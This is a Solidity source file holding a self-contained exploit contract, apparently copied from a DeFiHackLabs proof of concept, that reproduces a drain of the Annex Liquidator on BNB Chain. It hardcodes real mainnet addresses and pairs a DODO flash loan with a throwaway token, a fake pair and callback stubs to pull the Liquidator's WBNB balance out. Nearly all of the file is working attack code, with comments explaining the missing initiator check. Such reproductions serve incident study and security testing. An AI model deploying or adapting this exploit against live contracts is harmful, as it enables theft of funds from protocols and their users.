// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-Annex).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself, so
// there is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit + DPPFlashLoanCall +
// the MyERC20 "Shit Coin") so the playground can deploy it and record run().
// Logic, constants, and the throwaway-ERC20 are copied verbatim from
// test/Annex_exp.sol.
//
// Root cause: Annex's Liquidator never authenticates the flash-swap initiator
// in pancakeCall() — it only checks that msg.sender is *some* PancakeSwap pair.
// So an attacker deploys a worthless token + a fresh pair, drives the callback,
// and makes the Liquidator approve + transfer its OWN WBNB balance to the
// attacker as a bogus "flash-loan repayment".

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IUniRouterV2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniPairV2 {
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

// Minimal aToken-like interface the Liquidator calls back on. The attacker
// implements these as no-op stubs so the callback "succeeds" without any real
// liquidation. (Matches the inline stubs on the Foundry ContractTest.)
interface IABep20Stub {
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)
        external
        returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

contract AnnexDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IUniswapV2Factory constant Factory = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73);
    address constant DODO = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;
    address constant Liquidator = 0xe65E970F065643bA80E5822edfF483A1d75263E3;

    MyERC20 internal myToken; // attacker-controlled "Shit Coin"
    address internal pair; // attacker-owned Shit/WBNB pair
    uint256 internal wbnbAmount; // sized to drain Liquidator's WBNB balance

    // step 0: mint a worthless token, flash-borrow 8 WBNB from DODO (free working
    // capital, repaid at the end). The callback below does the actual drain.
    function run() external {
        myToken = new MyERC20();
        myToken.mint(10 * 1e18);
        IDVM(DODO).flashLoan(8 * 1e18, 0, address(this), new bytes(1));
    }

    // DODO flash-loan callback — body copied verbatim from ContractTest.DPPFlashLoanCall.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        myToken.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        Router.addLiquidity(
            address(myToken), address(WBNB), 8 * 1e18, 8 * 1e18, 0, 0, address(this), block.timestamp + 60
        );
        pair = Factory.getPair(address(myToken), address(WBNB));
        wbnbAmount = WBNB.balanceOf(Liquidator);
        bytes memory data1 = abi.encode(address(this), address(this), address(this));
        if (IUniPairV2(pair).token0() == address(WBNB)) {
            IUniPairV2(pair).swap(wbnbAmount, 0, Liquidator, data1);
        } else {
            IUniPairV2(pair).swap(0, wbnbAmount, Liquidator, data1);
        }
        IUniPairV2(pair).approve(address(Router), type(uint256).max);
        Router.removeLiquidity(
            address(myToken),
            address(WBNB),
            IUniPairV2(pair).balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 60
        );
        WBNB.transferFrom(Liquidator, address(this), WBNB.balanceOf(Liquidator));
        WBNB.transfer(DODO, 8 * 1e18);
    }

    // --- attacker stubs the Liquidator calls back into during pancakeCall ---
    // (the Foundry ContractTest exposes these as no-ops; they let the callback
    // "succeed" without performing any real liquidation/redeem.)
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)
        external
        returns (uint256)
    {
        return 0;
    }

    function balanceOf(address account) external returns (uint256) {
        return 0;
    }

    function redeem(uint256 redeemTokens) external returns (uint256) {
        return 0;
    }
}

// Verbatim copy of the throwaway "Shit Coin" from ContractTest.
contract MyERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "Shit Coin";
    string public symbol = "Shit";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address recipient, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
}
